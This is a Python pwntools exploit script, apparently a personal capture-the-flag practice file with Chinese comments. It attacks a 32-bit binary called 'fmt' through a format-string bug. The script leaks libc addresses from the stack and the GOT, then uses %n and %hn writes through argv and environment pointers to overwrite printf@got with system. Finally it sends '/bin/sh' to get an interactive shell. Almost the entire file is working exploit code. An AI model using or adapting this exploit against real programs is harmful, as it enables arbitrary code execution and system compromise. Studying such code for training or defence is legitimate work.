# coding:utf-8
# 不使用格式化串本身的数据作为参数，使用argv[]实现任意写
# 这种方法不要求格式化串本身在栈中，更为通用

from pwn import *

context.log_level='debug'

io = process('./fmt')
e = ELF('./fmt')
libc = ELF('/lib32/libc.so.6')


'''
0300| 0xffffd3ec --> 0xf7e25a63 (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)
0304| 0xffffd3f0 --> 0x1 
0308| 0xffffd3f4 --> 0xffffd484 --> 0xffffd5ec ("/media/sf_D_DRIVE/work/github/Practices/pwn/format_str/fmt")
0312| 0xffffd3f8 --> 0xffffd48c --> 0xffffd627 ("XDG_VTNR=7")
0316| 0xffffd3fc --> 0xf7feac7a (add    ebx,0x12386)
0320| 0xffffd400 --> 0x1 
0324| 0xffffd404 --> 0xffffd484 --> 0xffffd5ec ("/media/sf_D_DRIVE/work/github/Practices/pwn/format_str/fmt")
0328| 0xffffd408 --> 0xffffd424 --> 0xb9855a7c 
0332| 0xffffd40c --> 0x80497a4 --> 0xf7e25970 (<__libc_start_main>:	push   ebp)

0448| 0xffffd480 --> 0x1 
0452| 0xffffd484 --> 0xffffd5ec ("/media/sf_D_DRIVE/work/github/Practices/pwn/format_str/fmt")
0456| 0xffffd488 --> 0x0 
0460| 0xffffd48c --> 0xffffd627 ("XDG_VTNR=7")

0808| 0xffffd5e8 --> 0x0 
0812| 0xffffd5ec ("/media/sf_D_DRIVE/work/github/Practices/pwn/format_str/fmt")
0816| 0xffffd5f0 ("ia/sf_D_DRIVE/work/github/Practices/pwn/format_str/fmt")
'''

def do_fmt(fmt_str):
	io.sendline(fmt_str)
	return io.recvuntil('\n')

def leak_stack_buf(do_fmt, start, end, buf_size=20):
	buf = ''
	while start < end:
		# %x输出 #号分割
		fmt_str = ''
		while True:
			tmp = '#%' + str(start) + '$x'
			if len(fmt_str) + len(tmp) >  buf_size:
				break
			fmt_str += tmp
			start += 1
		fmt_str = fmt_str.strip('#') # 去掉开头的#
		try:
			result = do_fmt(fmt_str)
			result = result.strip() 	# 去掉\n

			for i in result.split('#'):
				buf += p32(int(i,16))
		except:
			break
	return buf

#write_map = {value:arg_index, ...}
def gen_fmt_payload(write_map):
	printed = 0
	payload = ''
	for value in sorted(write_map):
		tmp = value-printed
		if tmp > 0:
			payload += '%'+ str(tmp) + 'c%'
		payload += str(write_map[value]) +'$hn'
		printed = value 
	return payload


# 使这种方式可以dump栈中数据。只是测试，实际exploit中不需要
# buf = leak_stack_buf(do_fmt, 1, 100000, 180)
# log.info(hexdump(buf))

# 0308| 0xffffd3f4 --> 0xffffd484 --> 0xffffd5ec ("/media/sf_D_DRIVE/work/github/Practices/pwn/format_str/fmt")
off_arg = 77 # = 308/4

# 0312| 0xffffd3f8 --> 0xffffd48c --> 0xffffd627 ("XDG_VTNR=7")
off_env = 78 # = 312/4

# 0452| 0xffffd484 --> 0xffffd5ec ("/media/sf_D_DRIVE/work/github/Practices/pwn/format_str/fmt")
off_argv_data = 113  # = 452/4

# 0460| 0xffffd48c --> 0xffffd627 ("XDG_VTNR=7")
off_env_data = 115 # = 460/4

# 测试读取flag，实际exploit中不需要
#flag_addr = 0x080497B4
#do_fmt('%'+str(flag_addr)+'c%77$n') # 将argv_data赋值0x080497B4  使用%n写入 会输出巨量数据，运行非常慢
#buf = do_fmt('%113$s')
#log.info('flag: %s' % buf)


# 实际需要接收几百M的数据，本地可用，远程难用
def pwn1():

	do_fmt('%'+str(e.got['printf'])+'c%'+str(off_arg)+'$n')  # 用于写入低两位
	do_fmt('%'+str(e.got['printf']+2)+'c%'+str(off_env)+'$n') # 用于写入高两位

	buf = do_fmt('%'+str(off_argv_data)+'$s')

	#buf = leak(e.got['printf'])
	printf_addr = u32(buf[:4])
	log.info('printf addr: %#x'% printf_addr)

	libc_base = printf_addr - libc.symbols['printf']
	system_addr = libc_base + libc.symbols['system']

	log.info('system addr: %#x'% system_addr)

	# sytem地址过大，直接使用%n写入不会成功
	# 此时根据system地址 和113$ 115$写入

	payload = gen_fmt_payload({system_addr&0xFFFF:off_argv_data, system_addr>>16:off_env_data})

	do_fmt(payload)
	io.sendline('/bin/sh')
	io.interactive()

def pwn2():

	buf = do_fmt('%'+str(off_arg)+'$x')
	argv_data_addr = int(buf, 16)
	log.info('argv_data_addr: %#x' % argv_data_addr)

	buf = do_fmt('%'+str(off_env)+'$x')
	env_data_addr = int(buf, 16)
	log.info('argv_data_addr: %#x' % env_data_addr)

	# 将env_data的值赋成argv_data地址+2， 此后可以使用%hn写入argv_data(使用off_arg, off_env_data)
	do_fmt('%'+str((argv_data_addr+2)&0xFFFF) +'c%'+ str(off_env)+'$hn')


	#context.log_level = 'debug'

	def leak(addr):
		payload = gen_fmt_payload({addr&0xFFFF:off_arg, addr>>16:off_env_data })
		do_fmt(payload)

		buf = do_fmt('%'+str(off_argv_data)+'$x')
		argv_data = int(buf, 16)
		log.info('argv_data: %#x' % argv_data)

		buf = do_fmt('%'+str(off_argv_data)+'$s')
		buf = buf.strip()
		if len(buf)== 0:
			return '\x00'
		return buf

	printf_addr = u32(leak(e.got['printf'])[:4])
	log.info('printf addr: %#x'% printf_addr)

	libc_base = printf_addr - libc.symbols['printf']
	system_addr = libc_base + libc.symbols['system']

	log.info('system addr: %#x'% system_addr)


	payload = gen_fmt_payload({e.got['printf']&0xFFFF:off_arg, e.got['printf']>>16:off_env_data })
	do_fmt(payload)
	# 现在argv_data中存的是 printf@got

	# 将env_data的值赋成env_data地址+2
	do_fmt('%'+str((env_data_addr+2)&0xFFFF) +'c%'+ str(off_env)+'$hn')

	# 将env_data的值写成 printf@got+2
	payload = gen_fmt_payload({(e.got['printf']+2)&0xFFFF:off_env, (e.got['printf']+2)>>16:off_env_data })
	do_fmt(payload)

	log.info('printf@got: %#x' % e.got['printf'])
	log.info('argv_data: '+do_fmt('%'+ str(off_argv_data)+'$x'))
	log.info('env_data: '+do_fmt('%'+ str(off_env_data) + '$x'))

	payload = gen_fmt_payload({system_addr&0xFFFF:off_argv_data, system_addr>>16:off_env_data})
	do_fmt(payload)

	io.sendline('/bin/sh')
	io.interactive()


pwn2()